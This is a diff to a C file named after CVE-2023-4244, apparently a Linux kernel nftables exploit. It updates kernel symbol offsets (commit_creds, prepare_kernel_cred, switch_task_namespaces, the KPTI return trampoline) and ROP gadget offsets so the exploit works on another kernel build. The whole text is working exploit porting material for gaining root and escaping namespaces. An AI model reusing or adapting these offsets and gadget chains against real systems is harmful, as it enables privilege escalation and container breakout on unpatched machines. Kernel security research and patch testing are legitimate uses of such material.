--- exploit_cve-2023-4244.c
+++ exploit_cve-2023-4244.c
@@ -209,23 +209,23 @@
 #define PORT_SERVER 8888
 #define MSG_COUNT 1024
 
-#define NFT_NOTRACK_EVAL __kexploit_kernel_offset(0xe523f0)
+#define NFT_NOTRACK_EVAL __kexploit_kernel_offset(0xe69060)
 #define DMI_CLASS __kexploit_kernel_offset(0x28c83a0)
-#define KPTI_TRAMPOLINE __kexploit_kernel_offset(0x1201090) + 0x36 // swapgs_restore_regs_and_return_to_usermode + offset
-#define PREPARE_KERNEL_CRED __kexploit_kernel_offset(0x1befb0)
-#define COMMIT_CREDS __kexploit_kernel_offset(0x1bed10)
-#define FIND_TASK_BY_VPID __kexploit_kernel_offset(0x1b5600)
-#define SWITCH_TASK_NAMESPACES __kexploit_kernel_offset(0x1bd180)
+#define KPTI_TRAMPOLINE __kexploit_kernel_offset(0x1201110) + 0x36 // swapgs_restore_regs_and_return_to_usermode + offset
+#define PREPARE_KERNEL_CRED __kexploit_kernel_offset(0x1bfea0)
+#define COMMIT_CREDS __kexploit_kernel_offset(0x1bfc00)
+#define FIND_TASK_BY_VPID __kexploit_kernel_offset(0x1b64f0)
+#define SWITCH_TASK_NAMESPACES __kexploit_kernel_offset(0x1be070)
 #define INIT_NSPROXY __kexploit_kernel_offset(0x26765c0)
-#define KERNEL_BSS __kexploit_kernel_offset(0x35ffff0)
-
-#define PUSH_RSI_JMP_PTR_RSI_66 __kexploit_rop_offset(0xc8303f, "push rsi; jmp qword ptr [rsi + 0x66]")     // push rsi ; jmp qword ptr [rsi + 0x66]
-#define POP_RSP_R15_RET __kexploit_rop_offset(0x12cfbe, "pop rsp; pop r15; ret ")             // pop rsp ; pop r15 ; ret
-#define MOV_RDI_RAX_MOV_PTR_RDX_RCX __kexploit_rop_offset(0x6d014a, "mov rdi, rax; mov dword ptr [rdx], ecx; mov rax, rdi; jmp 0xffffffff82404b80") // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404b80
-#define POP_RDI_RET __kexploit_rop_offset(0x12cfc0, "pop rdi; ret ")                 // pop rdi ; ret
-#define POP_RSI_RET __kexploit_rop_offset(0x128ae9, "pop rsi; ret ")                 // pop rsi ; ret
-#define POP_RDX_RET __kexploit_rop_offset(0x1d75c2, "pop rdx; ret ")                 // pop rdx ; ret
-#define ADD_RSP_70_RET __kexploit_rop_offset(0x33fce8, "add rsp, 0x70; jmp 0xffffffff82404b80")              // add rsp, 0x70 ; jmp 0xffffffff82404b80
+#define KERNEL_BSS __kexploit_kernel_offset(0x3611b7c)
+
+#define PUSH_RSI_JMP_PTR_RSI_66 __kexploit_rop_offset(0xc4d37f, "push rsi; jmp qword ptr [rsi + 0x66]")     // push rsi ; jmp qword ptr [rsi + 0x66]
+#define POP_RSP_R15_RET __kexploit_rop_offset(0x12defe, "pop rsp; pop r15; ret ")             // pop rsp ; pop r15 ; ret
+#define MOV_RDI_RAX_MOV_PTR_RDX_RCX __kexploit_rop_offset(0x6db56a, "mov rdi, rax; mov dword ptr [rdx], ecx; mov rax, rdi; jmp 0xffffffff82404b80") // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404b80
+#define POP_RDI_RET __kexploit_rop_offset(0x2352, "pop rdi; ret ")                 // pop rdi ; ret
+#define POP_RSI_RET __kexploit_rop_offset(0x31fc, "pop rsi; ret ")                 // pop rsi ; ret
+#define POP_RDX_RET __kexploit_rop_offset(0x48c42, "pop rdx; ret ")                 // pop rdx ; ret
+#define ADD_RSP_70_RET __kexploit_rop_offset(0x3427b8, "add rsp, 0x70; jmp 0xffffffff82404b80")              // add rsp, 0x70 ; jmp 0xffffffff82404b80
 
 struct list_head
 {
